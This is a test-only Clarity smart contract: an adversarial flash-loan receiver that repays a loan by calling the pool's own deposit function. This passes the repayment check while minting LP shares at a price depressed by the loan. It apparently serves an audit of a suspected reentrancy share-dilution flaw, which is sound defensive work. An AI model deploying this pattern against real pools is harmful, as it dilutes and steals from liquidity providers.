;; TEST-ONLY receiver, adversarial: instead of repaying the loan with a plain
;; transfer, it calls back into flashstack-stx-pool-v2's own `deposit` with
;; (amount + fee). That satisfies the pool's balance-delta repayment check
;; (the pool's STX balance genuinely grows by >= fee) while ALSO minting the
;; caller LP shares -- priced against the pool's balance as depressed by this
;; same loan's outbound transfer, not the pool's balance before the loan.
;; Proves or disproves a hypothesized reentrancy-via-deposit share-dilution
;; vector distinct from pv3-F1 (which was about deposit miscounted as fee
;; revenue, not about minting shares at a manipulated price).
(impl-trait .stx-flash-receiver-trait.stx-flash-receiver-trait)

(define-public (execute-stx-flash (amount uint) (core principal))
  (let (
    (fee-bp  (unwrap! (contract-call? .flashstack-stx-pool-v2 get-fee-basis-points) (err u901)))
    (raw-fee (/ (* amount fee-bp) u10000))
    (fee     (if (> raw-fee u0) raw-fee u1))
  )
    (unwrap! (contract-call? .flashstack-stx-pool-v2 deposit (+ amount fee)) (err u902))
    (ok true)
  )
)
